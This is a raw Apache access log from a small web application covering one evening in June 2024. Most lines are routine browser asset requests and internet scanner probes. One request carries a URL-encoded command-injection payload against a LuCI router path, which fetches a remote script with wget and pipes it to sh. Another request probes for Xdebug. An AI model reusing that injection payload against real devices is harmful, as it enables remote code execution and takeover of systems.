106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:18:00:49 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:18:00:50 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:18:00:51 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
106.102.11.87 - - [27/Jun/2024:18:00:52 +0000] "GET /calendar/list HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:58 +0000] "GET /static/media/common1.7c741a6f0a021e66a3be.webp HTTP/1.1" 200 8012 "https://www.junghomun.com/calendar/save" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:18:00:58 +0000] "GET /static/media/common2.869688a6bd521f6416dc.webp HTTP/1.1" 200 6832 "https://www.junghomun.com/calendar/save" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:01:02 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:18:01:02 +0000] "GET /static/js/main.66e355ff.js.map HTTP/1.1" 200 58129006 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:18:01:29 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
162.142.125.218 - - [27/Jun/2024:18:07:51 +0000] "GET / HTTP/1.1" 200 748 "-" "-"
162.142.125.218 - - [27/Jun/2024:18:07:54 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.218 - - [27/Jun/2024:18:07:55 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
162.142.125.218 - - [27/Jun/2024:18:07:55 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
106.102.11.87 - - [27/Jun/2024:18:16:12 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:12 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:13 +0000] "GET /static/js/main.66e355ff.js HTTP/1.1" 200 38575971 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:34 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:34 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:34 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:34 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:34 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:34 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:34 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:35 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:35 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:35 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:34 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:38 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:16:38 +0000] "GET /static/js/main.66e355ff.js.map HTTP/1.1" 200 58129006 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:18:17:10 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
198.235.24.67 - - [27/Jun/2024:18:28:42 +0000] "\x16\x03\x01" 400 226 "-" "-"
198.235.24.67 - - [27/Jun/2024:18:28:43 +0000] "\x16\x03\x01" 400 226 "-" "-"
5.164.29.116 - - [27/Jun/2024:18:32:03 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 (scanner.ducks.party)"
5.164.29.116 - - [27/Jun/2024:18:32:04 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 (scanner.ducks.party)"
66.175.213.4 - - [27/Jun/2024:18:34:28 +0000] "\x16\x03\x01" 400 226 "-" "-"
106.102.11.87 - - [27/Jun/2024:18:43:04 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:04 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:13 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:04 +0000] "GET /static/js/main.08d089c0.js HTTP/1.1" 200 38575987 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:19 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:21 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:18:43:21 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:21 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:21 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:21 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:22 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:22 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:22 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:23 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:21 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:43:19 +0000] "GET /static/js/main.08d089c0.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:18:43:47 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
106.102.11.87 - - [27/Jun/2024:18:44:02 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:44:02 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:44:04 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:44:03 +0000] "GET /static/js/main.08d089c0.js HTTP/1.1" 200 38575987 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:44:21 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:44:22 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:44:20 +0000] "GET /static/js/main.08d089c0.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
185.191.127.212 - - [27/Jun/2024:18:46:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
91.92.250.147 - - [27/Jun/2024:18:53:55 +0000] "GET / HTTP/1.1" 200 748 "-" "python-requests/2.28.1"
106.102.11.112 - - [27/Jun/2024:18:57:59 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:57:59 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:00 +0000] "GET /static/js/main.08d089c0.js HTTP/1.1" 200 38575987 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:14 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:18:58:15 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
::1 - - [27/Jun/2024:18:58:21 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
83.97.73.245 - - [27/Jun/2024:19:19:32 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
133.242.174.119 - - [27/Jun/2024:19:32:15 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
47.128.19.153 - - [27/Jun/2024:19:32:22 +0000] "GET /MEATSTORE/qna/detailForm.do?num=39&pageNum=1 HTTP/1.1" 301 282 "-" "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Safari/537.36"
47.128.19.153 - - [27/Jun/2024:19:32:23 +0000] "GET /MEATSTORE/qna/detailForm.do?num=39&pageNum=1 HTTP/1.1" 200 748 "-" "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Safari/537.36"
47.128.19.153 - - [27/Jun/2024:19:32:24 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/MEATSTORE/qna/detailForm.do?num=39&pageNum=1" "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Safari/537.36"
47.128.19.153 - - [27/Jun/2024:19:32:23 +0000] "GET /static/js/main.08d089c0.js HTTP/1.1" 200 38575987 "https://www.junghomun.com/MEATSTORE/qna/detailForm.do?num=39&pageNum=1" "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:24 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:24 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 304 - "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:24 +0000] "GET /static/js/main.08d089c0.js HTTP/1.1" 304 - "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:25 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:25 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:25 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:25 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:25 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 304 - "https://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:25 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:26 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:26 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:26 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:26 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:28 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 304 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:36:28 +0000] "GET /static/js/main.08d089c0.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:19:36:54 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
106.102.11.87 - - [27/Jun/2024:19:39:55 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:39:55 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:39:57 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:19:39:56 +0000] "GET /static/js/main.a321ef8f.js HTTP/1.1" 200 38576035 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
